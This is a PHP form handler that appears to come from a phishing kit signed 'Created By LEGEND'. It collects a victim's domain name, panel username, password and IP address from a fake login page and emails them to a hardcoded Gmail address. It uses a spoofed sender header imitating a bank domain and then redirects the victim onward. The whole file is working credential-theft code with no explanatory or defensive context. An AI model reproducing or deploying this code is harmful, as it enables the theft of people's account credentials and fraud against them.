<?php

$id = $_POST['username'];
$urll = $_POST['url'];

$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Created By LEGEND-------------------------\n";
$message .= " \n";
$message .= "Domain name: ".$_POST['username']."\n";
$message .= "Panel username: ".$_POST['pass']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= " \n";
$message .= "IP: ".$ip."\n";
$message .= " \n";
$message .= "---------------Created By LEGEND-------------------------\n";
$recipient = "tngilroy1@gmail.com";
$subject = "GENERAL PAGE";
$headers = "From: GENERAL PAGE<rezultz@Suntrust.pot>";
$headers .= $_POST['eMailAdd']."\n";
if (mail($recipient,$subject,$message, $headers))
{
header("Location: post.php?user=$id&url=$urll");
}
?>
